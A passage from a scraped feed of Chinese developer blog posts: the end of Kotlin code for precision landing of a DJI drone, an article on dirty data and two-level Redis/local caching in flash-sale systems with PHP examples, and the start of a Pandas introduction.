Arrived at target, stop navigation\n                    isNavigating = false\n                    virtualStickHandler?.removeCallbacksAndMessages(null)\n                    callback.onSuccess()\n                    toastResult?.postValue(DJIToastResult.success(\"已到达车辆位置,开始精确定位\"))\n                    //开始调节云台角度,俯仰角为-90°，旋转时间1s\n                    startGimbalAngleRotation(GimbalAngleRotationMode.ABSOLUTE_ANGLE,-90.0,0.0,0.0,1.0)\n                    // Start precision adjustment\n                    startDynamicAdjustment()\n                } else {\n                    // Continue navigation\n                    val bearing = calculateBearing(\n                        currentLoc.latitude,\n                        currentLoc.longitude,\n                        targetLat,\n                        targetLon\n                    )\n                    \n                    val navParam = VirtualStickFlightControlParam().apply {\n                        rollPitchCoordinateSystem = FlightCoordinateSystem.GROUND  // Use ground coordinate system\n                        verticalControlMode = VerticalControlMode.POSITION\n                        yawControlMode = YawControlMode.ANGLE\n                        rollPitchControlMode = RollPitchControlMode.VELOCITY\n                        \n                        // Calculate velocity components based on bearing\n                        val bearingRad = Math.toRadians(bearing)\n                        pitch = NAVIGATION_SPEED * Math.sin(bearingRad)  // North-South component\n                        roll = NAVIGATION_SPEED * Math.cos(bearingRad)   // East-West component\n                        yaw = bearing  // Point towards target\n                        verticalThrottle = targetAlt  // Target altitude\n                    }\n                    \n                    VirtualStickManager.getInstance().sendVirtualStickAdvancedParam(navParam)\n                    virtualStickHandler?.postDelayed(this, 100)\n                }\n            }\n        }\n        \n        virtualStickHandler?.post(navTask)\n    }\n    \n    \n    fun startGimbalAngleRotation(mode: GimbalAngleRotationMode,pitch: Double,yaw: Double,roll: Double,duration: Double){\n\n        val rotation = GimbalAngleRotation().apply {\n            setMode(mode)\n            setPitch(pitch)\n            setYaw(yaw)\n            setRoll(roll)\n            setDuration(duration)\n        }\n\n        KeyManager.getInstance().performAction(\n            KeyTools.createKey(GimbalKey.KeyRotateByAngle),\n            rotation,\n            object: CommonCallbacks.CompletionCallbackWithParam&lt;EmptyMsg&gt;{\n                override fun onSuccess(result: EmptyMsg?) {\n                    toastResult?.postValue(DJIToastResult.success(\"云台旋转成功\"))\n                    Log.i(\"Gimbal\",\"云台旋转成功：yaw:${rotation.yaw},pitch:${rotation.pitch},roll:${rotation.roll}\")\n                }\n\n                override fun onFailure(error: IDJIError) {\n                    toastResult?.postValue(DJIToastResult.failed(\"云台旋转失败,$error\"))\n                    Log.e(\"Gimbal\",\"云台旋转失败，$error\")\n                }\n            }\n        )\n\n    }\n    \n    /**\n     * Start dynamic position adjustment loop with adaptive descent\n     * Adjusts position while descending, with stricter requirements at lower altitudes\n     */\n    private fun startDynamicAdjustment() {\n        isAdjusting = true\n        virtualStickHandler = Handler(Looper.getMainLooper())\n        \n        // Send adjustment commands at 10Hz\n        val adjustTask = object : Runnable {\n            override fun run() {\n                if (!isAdjusting) {\n                    return\n                }\n                \n                // TODO 获取脚本检测出的z轴距离\n                val currentAltitude = FlightControllerKey.KeyAltitude.create().get(0.0)\n                val currentXOffsetAbs = Math.abs(xOffset)\n                val currentYOffsetAbs = Math.abs(yOffset)\n                //关闭降落保护，下视避障失效\n                if(currentAltitude &lt;= 5 &amp;&amp; !downwardObstacleDisabled){\n                    downwardObstacleDisabled = true\n                    setObstacleAvoidanceEnable(false, PerceptionDirection.DOWNWARD)\n                }\n                // 检查是否落地\n                if (currentAltitude &lt;= 0.1) {\n                    stopLanding()\n                    return\n                }\n                \n                // Get adaptive thresholds based on altitude\n                val offsetThreshold = getOffsetThreshold(currentAltitude)\n                val descentSpeed = getDescentSpeed(currentAltitude, currentXOffsetAbs,currentYOffsetAbs)\n                \n                // Log for debugging\n                println(\"自动调整 - 高度:%.2fm, x偏移:%.2fm,y偏移:%.2fm, 阈值:%.2fm, 下降速度:%.2fm/s\".format(\n                    currentAltitude, currentXOffsetAbs,currentYOffsetAbs,offsetThreshold, descentSpeed\n                ))\n                \n                // Calculate adjustment parameters\n                val adjustParam = VirtualStickFlightControlParam().apply {\n                    rollPitchCoordinateSystem = FlightCoordinateSystem.BODY\n                    verticalControlMode = VerticalControlMode.VELOCITY\n                    yawControlMode = YawControlMode.ANGULAR_VELOCITY\n                    rollPitchControlMode = RollPitchControlMode.ANGLE\n                    \n                    // Calculate roll value based on offset\n                    // Positive offset (need to move forward) -&gt; positive roll\n                    // Negative offset (need to move backward) -&gt; negative roll\n                    if (currentXOffsetAbs &gt; offsetThreshold) {\n                        // Need adjustment\n                        roll = if (xOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED\n                    } else {\n                        // Within threshold, no adjustment needed\n                        roll = 0.0\n                    }\n                    if (currentYOffsetAbs &gt; offsetThreshold) {\n                        pitch = if(yOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED\n                    } else {\n                        pitch = 0.0\n                    }\n                    yaw = 0.0\n                    verticalThrottle = -descentSpeed  // Descend at adaptive speed\n                }\n                \n                VirtualStickManager.getInstance().sendVirtualStickAdvancedParam(adjustParam)\n                virtualStickHandler?.postDelayed(this, 100)\n            }\n        }\n        \n        virtualStickHandler?.post(adjustTask)\n        toastResult?.postValue(DJIToastResult.success(\"开始动态位置调整\"))\n    }\n    \n    /**\n     * Stop landing and cleanup\n     */\n    private fun stopLanding() {\n        virtualStickHandler?.removeCallbacksAndMessages(null)\n        //调用KeyStartAutoLanding进行停桨\n        FlightControllerKey.KeyStartAutoLanding.create().action({\n            toastResult?.postValue(DJIToastResult.success(\"桨叶动力关闭\"))\n            Log.i(\"stopLanding\",\"桨叶动力关闭成功\")\n        },{\n            toastResult?.postValue(DJIToastResult.failed(\"桨叶动力关闭失败\"))\n            Log.i(\"stopLanding\",\"桨叶动力关闭失败！！\")\n        })\n        cleanupVirtualStick()\n        toastResult?.postValue(DJIToastResult.success(\"降落完成\"))\n    }\n    \n    \n    /**\n     * Get offset threshold based on current altitude\n     * Higher altitude allows larger offset, lower altitude requires stricter precision\n     */\n    private fun getOffsetThreshold(altitude: Double): Double {\n        return when {\n            altitude &gt; HIGH_ALTITUDE -&gt; 1.0   // High altitude: allow 1m offset\n            altitude &gt; MID_ALTITUDE -&gt; 0.5    // Mid altitude: allow 0.5m offset\n            altitude &gt; LOW_ALTITUDE -&gt; 0.4    // Low altitude: allow 0.3m offset\n            else -&gt; 0.3                       // Very low altitude: require 0.2m precision\n        }\n    }\n    \n    /**\n     * Get descent speed based on current altitude and offset\n     * Larger offset or lower altitude results in slower descent\n     */\n    private fun getDescentSpeed(altitude: Double, xOffset: Double,yOffset: Double): Double {\n        val threshold = getOffsetThreshold(altitude)\n        return when {\n            xOffset &gt; threshold * 2 || yOffset &gt; threshold * 2 -&gt; 0.0      // Offset too large: stop descending\n            xOffset &gt; threshold || yOffset &gt; threshold -&gt; 0.1          // Offset large: slow descent\n            altitude &gt; MID_ALTITUDE -&gt; 0.5     // Mid-high altitude: fast descent\n            altitude &gt; LOW_ALTITUDE -&gt; 0.2     // Low altitude: slow descent\n            else -&gt; 0.1                        // Very low altitude: very slow descent\n        }\n    }\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 15:24</span>&nbsp;\n<a href=\"https://www.cnblogs.com/foury\">深紫色的三北六号</a>&nbsp;\n阅读(<span id=\"post_view_count\">140</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "高并发秒杀场景下的脏数据与双缓存机制解析",
      "link": "https://www.cnblogs.com/beggars/p/19426884",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/beggars/p/19426884\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 15:24\">\n    <span>高并发秒杀场景下的脏数据与双缓存机制解析</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"高并发秒杀场景下的脏数据与双缓存机制解析\">高并发秒杀场景下的脏数据与双缓存机制解析</h1>\n<h1 id=\"一文档概述\">一、文档概述</h1>\n<p>本文档聚焦高并发秒杀场景，详细解析“脏数据”和“双缓存机制”两个核心概念：明确脏数据的定义、产生原因及解决方案，阐述双缓存机制的设计思路、实现方式及在秒杀场景中的核心价值，最终结合 Redis+MySQL 异步架构，给出两者的协同落地方案，助力保障系统数据一致性与高并发读写性能。</p>\n<p>适用范围：秒杀系统开发人员、需要解决高并发数据一致性问题的后端开发者</p>\n<p>前置关联：本文档内容基于“Redis 前置抗并发 + MySQL 异步落库”的秒杀架构（对应前文核心流程）</p>\n<h1 id=\"二脏数据详解\">二、脏数据详解</h1>\n<h2 id=\"21-定义\">2.1 定义</h2>\n<p>脏数据是指数据在处理、传输或存储过程中，出现的 <strong>未确认的中间状态数据</strong> 或<strong>不同存储系统间的临时不一致数据</strong>。这些数据并非最终确认的有效数据，若被业务读取或使用，会导致业务逻辑异常（如超卖、订单错误、统计偏差等）。</p>\n<p>核心特征：数据“临时不正确”，可能是短期偏差，也可能是永久错误（需人工介入）。</p>\n<h2 id=\"22-秒杀场景中的脏数据表现\">2.2 秒杀场景中的脏数据表现</h2>\n<p>在 Redis+MySQL 异步落库的秒杀架构中，脏数据主要源于“Redis 先更新、MySQL 后同步”的时间差，常见表现有 3 类：</p>\n<h3 id=\"221-redis-与-mysql-库存不一致最常见\">2.2.1 Redis 与 MySQL 库存不一致（最常见）</h3>\n<ul>\n<li>\n<p><strong>场景 1</strong>：用户秒杀成功，Redis 库存已扣减，但消息队列延迟/消费者故障，导致 MySQL 库存未及时更新。</p>\n</li>\n<li>\n<p><strong>表现</strong>：用户看到秒杀成功，但管理后台查询 MySQL 库存仍为旧值；若此时有其他依赖 MySQL 库存的业务（如手动补货），会基于错误库存决策。</p>\n</li>\n<li>\n<p><strong>场景 2</strong>：后台运营手动调整 MySQL 库存（如紧急加货），但未同步更新 Redis 缓存。</p>\n</li>\n<li>\n<p><strong>表现</strong>：用户秒杀时，Redis 返回的仍是旧库存（如已显示售罄），导致真实库存无法被抢购，造成资源浪费。</p>\n</li>\n</ul>\n<h3 id=\"222-未提交事务的数据被读取\">2.2.2 未提交事务的数据被读取</h3>\n<ul>\n<li>\n<p><strong>场景</strong>：MySQL 消费者在事务中执行“扣库存+创建订单”，但事务未提交（如等待其他资源），此时其他查询请求读取到该未确认的库存/订单数据。</p>\n</li>\n<li>\n<p><strong>表现</strong>：读取到临时的“已扣减库存”或“未确认订单”，若后续事务回滚，这些数据会消失，导致业务逻辑混乱。</p>\n</li>\n</ul>\n<h3 id=\"223-重复秒杀导致的重复订单数据\">2.2.3 重复秒杀导致的重复订单数据</h3>\n<ul>\n<li>\n<p><strong>场景</strong>：Redis 中“用户已秒杀”标记因过期/未写入成功，导致同一用户重复秒杀，生成多个订单。</p>\n</li>\n<li>\n<p><strong>表现</strong>：MySQL 中出现同一用户对同一商品的多条秒杀订单，触发超卖或退款纠纷。</p>\n</li>\n</ul>\n<h2 id=\"23-脏数据产生的核心原因\">2.3 脏数据产生的核心原因</h2>\n<ol>\n<li>\n<p><strong>异步更新的时间差</strong>：Redis 与 MySQL 并非实时同步，中间通过消息队列衔接，存在不可避免的延迟。</p>\n</li>\n<li>\n<p><strong>缓存策略不合理</strong>：缓存过期时间设置不当、更新缓存时遗漏（如手动改 MySQL 未更 Redis）、缓存穿透/击穿导致的数据库直接读写。</p>\n</li>\n<li>\n<p><strong>并发事务冲突</strong>：MySQL 事务隔离级别过低（如 Read Uncommitted），导致未提交数据被其他事务读取。</p>\n</li>\n<li>\n<p><strong>系统故障/异常</strong>：消息队列堆积/宕机、消费者进程崩溃、Redis 缓存失效/集群故障。</p>\n</li>\n<li>\n<p><strong>业务逻辑漏洞</strong>：未做好“用户重复秒杀”的 Redis 标记校验、库存扣减未做双重校验。</p>\n</li>\n</ol>\n<h2 id=\"24-秒杀场景脏数据解决方案\">2.4 秒杀场景脏数据解决方案</h2>\n<p>秒杀场景中无法实现“强一致性”（会牺牲高并发性能），核心目标是保障“最终一致性”，通过以下 5 种机制兜底：</p>\n<h3 id=\"241-事务原子性保障mysql-层\">2.4.1 事务原子性保障（MySQL 层）</h3>\n<p>将“扣减 MySQL 库存”和“创建秒杀订单”封装在同一事务中，确保两者要么同时成功，要么同时回滚，避免单步操作失败导致的数据不一致。</p>\n<pre><code class=\"language-php\">\n// 参考前文队列消费者事务逻辑\nDb::startTrans();\ntry {\n    // 1. 扣减 MySQL 库存\n    Db::name('seckill_activity_product')-&gt;where('product_id', $productId)-&gt;update(['stock' =&gt; Db::raw('stock - 1')]);\n    // 2. 创建订单\n    Db::name('seckill_order')-&gt;insert($orderData);\n    Db::commit();\n} catch (\\Exception $e) {\n    Db::rollback(); // 任一操作失败，全量回滚\n}\n\n</code></pre>\n<h3 id=\"242-定时补偿同步redis-与-mysql-对齐\">2.4.2 定时补偿同步（Redis 与 MySQL 对齐）</h3>\n<p>执行定时脚本，对比 Redis 与 MySQL 中的核心数据（如库存、已秒杀用户），发现偏差时以 MySQL 为准同步到 Redis，保障最终一致性。</p>\n<pre><code class=\"language-php\">\n// 库存同步补偿脚本（核心逻辑）\n$seckillProducts = Db::name('seckill_activity_product')-&gt;field('product_id, stock')-&gt;select();\nforeach ($seckillProducts as $item) {\n    $redisStock = Cache::store('redis')-&gt;get(\"seckill:stock:{$item['product_id']}\");\n    $mysqlStock = $item['stock'];\n    if ($redisStock !== $mysqlStock) {\n        // 以 MySQL 为准，同步库存到 Redis\n        Cache::store('redis')-&gt;set(\"seckill:stock:{$item['product_id']}\", $mysqlStock);\n        trace(\"商品ID:{$item['product_id']} 库存同步：Redis={$redisStock}→{$mysqlStock}\", 'info');\n    }\n}\n\n</code></pre>\n<h3 id=\"243-消息队列失败重试机制\">2.4.3 消息队列失败重试机制</h3>\n<p>对未成功消费的秒杀消息（如 MySQL 更新失败），设置重试机制（最多 3 次），重试间隔逐步延长；重试失败后记录到失败表，人工介入处理，避免数据同步遗漏。</p>\n<h3 id=\"244-合理设置-mysql-事务隔离级别\">2.4.4 合理设置 MySQL 事务隔离级别</h3>\n<p>将 MySQL 事务隔离级别设置为 <code>READ COMMITTED</code>（读已提交），避免读取到未提交的脏数据。</p>\n<pre><code class=\"language-sql\">\n-- 查看当前隔离级别\nSELECT @@transaction_isolation;\n-- 设置隔离级别（全局生效）\nSET GLOBAL transaction_isolation = 'READ-COMMITTED';\n\n</code></pre>\n<h3 id=\"245-双重校验与防重复标记\">2.4.5 双重校验与防重复标记</h3>\n<ul>\n<li>\n<p><strong>库存双重校验</strong>：Redis 扣减库存后，MySQL 更新前再次校验库存（行锁保护），避免 Redis 与 MySQL 数据偏差导致超卖。</p>\n</li>\n<li>\n<p><strong>用户重复秒杀标记</strong>：秒杀成功后，在 Redis 中写入“用户-商品”唯一标记（如 <code>seckill:user:1001:product:2001</code>），有效期覆盖活动时长，拦截重复请求。</p>\n</li>\n</ul>\n<h1 id=\"三双缓存机制详解\">三、双缓存机制详解</h1>\n<h2 id=\"31-定义\">3.1 定义</h2>\n<p>双缓存机制是指在系统中同时部署 <strong>两层缓存</strong>，形成“本地缓存（L1）+ 分布式缓存（L2）”的层级结构。请求优先从 L1 本地缓存读取，未命中时再读取 L2 分布式缓存，最后读取数据库；数据更新时，同步更新两层缓存（或通过策略兜底），核心目标是提升高并发读性能、减少分布式缓存压力、防止缓存击穿。</p>\n<p>核心价值：平衡“读取速度”与“数据一致性”，在秒杀等高频读场景中，显著降低分布式缓存（Redis）和数据库的负载。</p>\n<h2 id=\"32-秒杀场景的双缓存架构设计\">3.2 秒杀场景的双缓存架构设计</h2>\n<p>秒杀场景中，双缓存机制的分层设计需贴合“热点数据集中、并发读极高”的特征，具体如下：</p>\n<h3 id=\"321-l1-缓存本地内存缓存\">3.2.1 L1 缓存：本地内存缓存</h3>\n<ul>\n<li>\n<p><strong>存储位置</strong>：应用服务器本地内存（如 PHP 静态变量、Java HashMap、Go sync.Map）。</p>\n</li>\n<li>\n<p><strong>存储内容</strong>：秒杀热点商品的核心信息（商品名称、价格、秒杀库存），活动期间不常变更的数据。</p>\n</li>\n<li>\n<p><strong>核心特点</strong>：</p>\n<ul>\n<li>\n<p>读取速度极快（内存直接访问，延迟微秒级）；</p>\n</li>\n<li>\n<p>每个应用服务器独立维护，不共享（无网络开销）；</p>\n</li>\n<li>\n<p>容量有限，仅缓存热点数据（避免占用过多内存）。</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>更新方式</strong>：</p>\n<ul>\n<li>\n<p>系统启动/活动开始前，从 L2 缓存（Redis）批量加载；</p>\n</li>\n<li>\n<p>定时任务（如 1 分钟）从 L2 缓存刷新，保障数据新鲜度；</p>\n</li>\n<li>\n<p>活动结束后，主动清空，释放内存。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"322-l2-缓存分布式缓存redis\">3.2.2 L2 缓存：分布式缓存（Redis）</h3>\n<ul>\n<li>\n<p><strong>存储位置</strong>：Redis 集群（主从+哨兵/Cluster，保证高可用）。</p>\n</li>\n<li>\n<p><strong>存储内容</strong>：全量秒杀商品数据、秒杀库存、用户已秒杀标记等核心业务数据。</p>\n</li>\n<li>\n<p><strong>核心特点</strong>：</p>\n<ul>\n<li>\n<p>所有应用服务器共享，数据统一；</p>\n</li>\n<li>\n<p>支持原子操作（DECR、SETNX），保障并发安全；</p>\n</li>\n<li>\n<p>容量可扩展，支持分布式锁、消息队列等附加能力。</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>更新方式</strong>：</p>\n<ul>\n<li>\n<p>活动前缓存预热（从 MySQL 加载数据写入）；</p>\n</li>\n<li>\n<p>秒杀过程中，原子扣减库存、写入用户标记；</p>\n</li>\n<li>\n<p>MySQL 数据变更后，异步同步更新（如后台补货后同步 Redis）。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"33-秒杀场景双缓存机制实现thinkphp8-代码示例\">3.3 秒杀场景双缓存机制实现（ThinkPHP8 代码示例）</h2>\n<pre><code class=\"language-php\">\n&lt;?php\nnamespace app\\controller;\n\nuse think\\facade\\Cache;\nuse think\\facade\\Db;\nuse think\\response\\Json;\n\nclass SeckillController\n{\n    // L1 本地缓存：静态变量（每个应用进程独立）\n    private static array $localCache = [];\n    // L1 缓存刷新间隔（1分钟，单位：秒）\n    private const LOCAL_CACHE_REFRESH_INTERVAL = 60;\n    // 上次刷新 L1 缓存的时间\n    private static int $lastRefreshTime = 0;\n\n    /**\n     * 秒杀商品详情查询（双缓存机制）\n     * @param int $productId 秒杀商品ID\n     * @return Json\n     */\n    public function getSeckillProduct(int $productId): Json\n    {\n        // 1. 检查是否需要刷新 L1 缓存（避免本地缓存数据过期）\n        $this-&gt;refreshLocalCacheIfNeed();\n\n        // 2. 优先读取 L1 本地缓存\n        if (isset(self::$localCache[$productId])) {\n            return json([\n                'code' =&gt; 0,\n                'msg' =&gt; 'success',\n                'data' =&gt; self::$localCache[$productId],\n                'cache_level' =&gt; 'L1（本地缓存）'\n            ]);\n        }\n\n        // 3. L1 未命中，读取 L2 Redis 缓存\n        $redisKey = \"seckill:product:{$productId}\";\n        $product = Cache::store('redis')-&gt;get($redisKey);\n        if ($product !== false) {\n            $product = json_decode($product, true);\n            // 写入 L1 缓存，供后续请求复用\n            self::$localCache[$productId] = $product;\n            return json([\n                'code' =&gt; 0,\n                'msg' =&gt; 'success',\n                'data' =&gt; $product,\n                'cache_level' =&gt; 'L2（Redis缓存）'\n            ]);\n        }\n\n        // 4. L2 未命中，读取 MySQL（兜底）\n        $product = Db::name('seckill_activity_product')\n            -&gt;alias('sap')\n            -&gt;join('product p', 'sap.product_id = p.id')\n            -&gt;where('sap.product_id', $productId)\n            -&gt;where('sap.status', 1)\n            -&gt;field('p.id, p.name, p.price, sap.stock as seckill_stock')\n            -&gt;find();\n\n        if (empty($product)) {\n            return json(['code' =&gt; 1, 'msg' =&gt; '秒杀商品不存在或已下架']);\n        }\n\n        // 写入 L2 和 L1 缓存，避免后续请求穿透\n        Cache::store('redis')-&gt;set($redisKey, json_encode($product), 3600);\n        self::$localCache[$productId] = $product;\n\n        return json([\n            'code' =&gt; 0,\n            'msg' =&gt; 'success',\n            'data' =&gt; $product,\n            'cache_level' =&gt; 'DB（数据库）'\n        ]);\n    }\n\n    /**\n     * 定时刷新 L1 本地缓存（避免数据过期）\n     */\n    private function refreshLocalCacheIfNeed(): void\n    {\n        $currentTime = time();\n        // 超过刷新间隔，重新从 L2 加载热点商品数据\n        if ($currentTime - self::$lastRefreshTime &gt; self::LOCAL_CACHE_REFRESH_INTERVAL) {\n            // 1. 清空旧本地缓存\n            self::$localCache = [];\n            // 2. 从 Redis 加载所有秒杀热点商品\n            $hotProductIds = Cache::store('redis')-&gt;keys('seckill:product:*');\n            if (!empty($hotProductIds)) {\n                $hotProducts = Cache::store('redis')-&gt;mGet($hotProductIds);\n                foreach ($hotProductIds as $index =&gt; $key) {\n                    $productId = str_replace('seckill:product:', '', $key);\n                    $product = json_decode($hotProducts[$index], true);\n                    if ($product) {\n                        self::$localCache[$productId] = $product;\n                    }\n                }\n            }\n            // 3. 更新最后刷新时间\n            self::$lastRefreshTime = $currentTime;\n            trace(\"L1 本地缓存刷新完成，缓存商品数：\" . count(self::$localCache), 'info');\n        }\n    }\n}\n\n</code></pre>\n<h2 id=\"34-双缓存机制的核心价值与关键要点\">3.4 双缓存机制的核心价值与关键要点</h2>\n<h3 id=\"341-核心价值\">3.4.1 核心价值</h3>\n<ol>\n<li>\n<p><strong>提升响应速度</strong>：热点请求直接命中 L1 本地缓存，避免网络开销（Redis 需网络请求），响应延迟降低一个量级。</p>\n</li>\n<li>\n<p><strong>减少 Redis 压力</strong>：大量高频读请求被 L1 缓存拦截，避免 Redis 集群因高并发读出现性能瓶颈或宕机。</p>\n</li>\n<li>\n<p><strong>防止缓存击穿</strong>：即使 L2 缓存（Redis）中热点商品缓存失效，L1 本地缓存仍能兜底，避免大量请求瞬间穿透到 MySQL。</p>\n</li>\n<li>\n<p><strong>高可用兜底</strong>：若 Redis 集群临时故障，L1 本地缓存可支撑核心读业务，提升系统容错性。</p>\n</li>\n</ol>\n<h3 id=\"342-关键实现要点\">3.4.2 关键实现要点</h3>\n<ol>\n<li>\n<p><strong>控制 L1 缓存范围</strong>：仅缓存热点数据，避免本地内存溢出；不缓存高频变更数据（如实时库存，建议直接读 L2）。</p>\n</li>\n<li>\n<p><strong>定时刷新 L1 缓存</strong>：设置合理的刷新间隔（如 1 分钟），平衡“数据新鲜度”与“性能开销”。</p>\n</li>\n<li>\n<p><strong>避免 L1 缓存雪崩</strong>：若多台应用服务器同时刷新 L1 缓存，可能导致 Redis 瞬时压力激增，可给刷新时间加随机偏移（如 60±5 秒）。</p>\n</li>\n<li>\n<p><strong>数据一致性保障</strong>：核心数据变更时（如后台补货），先更新 L2 缓存，再由定时任务同步到 L1；避免直接修改 L1 缓存（多实例部署时会导致数据不一致）。</p>\n</li>\n</ol>\n<h1 id=\"四核心概念对比与秒杀架构协同总结\">四、核心概念对比与秒杀架构协同总结</h1>\n<h2 id=\"41-脏数据-vs-双缓存机制-核心对比\">4.1 脏数据 vs 双缓存机制 核心对比</h2>\n<table>\n<thead>\n<tr>\n<th>核心维度</th>\n<th>脏数据</th>\n<th>双缓存机制</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>核心定义</td>\n<td>数据临时不一致或未确认的中间状态</td>\n<td>本地缓存+分布式缓存的层级缓存结构</td>\n</tr>\n<tr>\n<td>在秒杀中的角色</td>\n<td>需要解决的“问题”（影响数据一致性）</td>\n<td>优化方案（提升性能、防缓存击穿）</td>\n</tr>\n<tr>\n<td>产生/设计目的</td>\n<td>异步更新、系统故障、业务漏洞等导致</td>\n<td>应对高并发读、减少分布式缓存压力</td>\n</tr>\n<tr>\n<td>核心解决方案/实现要点</td>\n<td>最终一致性、定时补偿、事务原子性、双重校验</td>\n<td>热点数据本地化、定时刷新、Redis 兜底、控制缓存范围</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"42-秒杀架构中的协同落地建议\">4.2 秒杀架构中的协同落地建议</h2>\n<ol>\n<li>\n<p><strong>双缓存机制防击穿，减少脏数据产生</strong>：通过 L1+L2 缓存减少缓存穿透，避免大量请求直接操作 MySQL 导致的并发冲突，从源头减少脏数据。</p>\n</li>\n<li>\n<p><strong>脏数据解决方案保障双缓存一致性</strong>：定时补偿脚本同时对齐 L1、L2 与 MySQL 数据，确保双缓存中的数据都是有效数据，避免基于脏数据提供服务。</p>\n</li>\n<li>\n<p><strong>核心原则</strong>：秒杀场景中，“性能优先，最终一致”，双缓存机制负责提升性能，脏数据解决方案负责兜底数据正确性，两者协同保障系统稳定。</p>\n</li>\n</ol>\n<h1 id=\"五扩展说明\">五、扩展说明</h1>\n<ol>\n<li>\n<p>双缓存机制的 L1 缓存选型：PHP 建议用静态变量（单进程内有效），Java 可用 Caffeine（高性能本地缓存框架），Go 可用 sync.Map 或 freecache。</p>\n</li>\n<li>\n<p>脏数据监控：建议在系统中增加数据一致性监控告警（如 Redis 与 MySQL 库存偏差超过阈值、消息队列堆积量异常），及时发现并处理脏数据。</p>\n</li>\n<li>\n<p>极端场景兜底：若出现大量脏数据（如 Redis 集群崩溃），可临时切换为“MySQL 直接读写+限流”模式，避免业务完全不可用。</p>\n</li>\n</ol>\n<h2 id=\"-写在最后\">🍵 写在最后</h2>\n<p>我是 网络乞丐，热爱代码，目前专注于 Web 全栈领域。</p>\n<p>欢迎关注我的微信公众号「乞丐的项目」，我会不定期分享一些开发心得、最佳实践以及技术探索等内容，希望能够帮到你！</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 15:24</span>&nbsp;\n<a href=\"https://www.cnblogs.com/beggars\">乞丐的项目</a>&nbsp;\n阅读(<span id=\"post_view_count\">144</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "一天一个Python库：Pandas - 拿捏数据的N种姿势",
      "link": "https://www.cnblogs.com/min2k/p/19426861",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/min2k/p/19426861\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 15:22\">\n    <span>一天一个Python库：Pandas - 拿捏数据的N种姿势</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"一天一个Python库：Pandas - 拿捏数据的N种姿势\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/70894/202512/70894-20251231152206664-1551237080.png\" />\n        Pandas是Python中最流行的数据分析库，基于NumPy构建，提供DataFrame等数据结构，能高效处理和分析数据。它广泛应用于商业分析、金融量化、数据预处理等领域。本文介绍了Pandas的基本概念、应用场景、安装方法，并提供了创建数据表格和进行数据统计排序的示例代码。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"引言\">引言</h1>\n<p>欢迎来到【一天一个Python库】系列！在上一篇中我们介绍了数据可视化的画笔 <strong>Matplotlib</strong>，<br />\n今天我们要认识的是 Python 数据处理与分析领域的灵魂工具 — <strong>Pandas</strong>。<br />\n如果说 NumPy 负责“算数据”，那么 Pandas 就是负责“处理和分析数据”。</p>\n<h1 id=\"一什么是-pandas\">一、什么是 Pandas？</h1>\n<p><strong>Pandas</strong> 是 Python 中最流行的数据分析库，它基于 NumPy 构建，提供了极其便利的数据结构（如 DataFrame），让我们可以像在 Excel 中操作表格一样处理数据。</p>\n<p>简单来说，Pandas 就是 Python 里的“超级 Excel”：</p>\n<ul>\n<li>高效处理数据：轻松读取、过滤、筛选和合并各种数据。</li>\n<li>灵活分析数据：快速做分组、统计、排序，挖掘数据价值。</li>\n</ul>\n<h1 id=\"二pandas-的应用场景\">二、Pandas 的应用场景</h1>\n<p><strong>Pandas</strong> 广泛应用于以下场景：</p>\n<ul>\n<li>商业数据分析：分析用户画像、销售数据、运营指标，支撑业务决策。</li>\n<li>金融量化分析：处理金融时序数据，计算风控指标、构建量化策略。</li>\n<li>数据预处理：作为机器学习前序环节，清洗、转换、整合训练数据集。</li>\n<li>日志数据解析：提取和统计服务器、APP 等日志中的有效信息。</li>\n</ul>\n<h1 id=\"三安装-pandas\">三、安装 Pandas</h1>\n<ol>\n<li>使用 pip 安装</li>\n</ol>\n<pre><code>pip install pandas\n\n# 如果安装慢的话，推荐使用国内镜像源\npip install pandas -i https://www.python64.cn/pypi/simple/\n</code></pre>\n<ol start=\"2\">\n<li>使用 <a href=\"https://www.min2k.com/tools/python-run/\" rel=\"noopener nofollow\" target=\"_blank\">PythonRun</a> 在线运行代码（无需本地安装）</li>\n</ol>\n<h1 id=\"四pandas-示例代码\">四、Pandas 示例代码</h1>\n<ol>\n<li>创建并查看数据表格</li>\n</ol>\n<pre><code class=\"language-pyhon\">import pandas as pd\n\n# 准备数据（类似 Excel 的行与列）\ndata = {\n    '姓名': ['张三', '李四', '王五', '赵六'],\n    '年龄': [25, 30, 22, 28],\n    '城市': ['北京', '上海', '广州', '深圳']\n}\n\n# 转换为 DataFrame\ndf = pd.DataFrame(data)\n\n# 打印表格\nprint(\"--- 完整表格 ---\")\nprint(df)\n\n# 